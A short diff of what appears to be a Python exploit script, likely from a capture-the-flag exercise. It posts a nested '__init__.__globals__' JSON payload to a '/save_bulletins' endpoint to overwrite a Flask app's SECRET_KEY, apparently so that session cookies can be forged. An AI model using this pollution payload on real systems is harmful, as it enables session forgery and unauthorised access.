@@ -20,7 +20,7 @@ def encode_flask_cookie(secret_key, cookie):
 
 myobj = {
     "__init__" : { "__globals__" : { "app" : { "config" : { "SECRET_KEY" : key } } } },
-    "new_content": [{ "title": "asdf", "text": "asdf" }, { "title": "qwer", "text": "qwer" }]
+    "new_content": [{ "title": "Good Morning", "text": "Hi YMD!" }]
 }
 
 x = requests.post(f"{host}/save_bulletins", json=myobj)
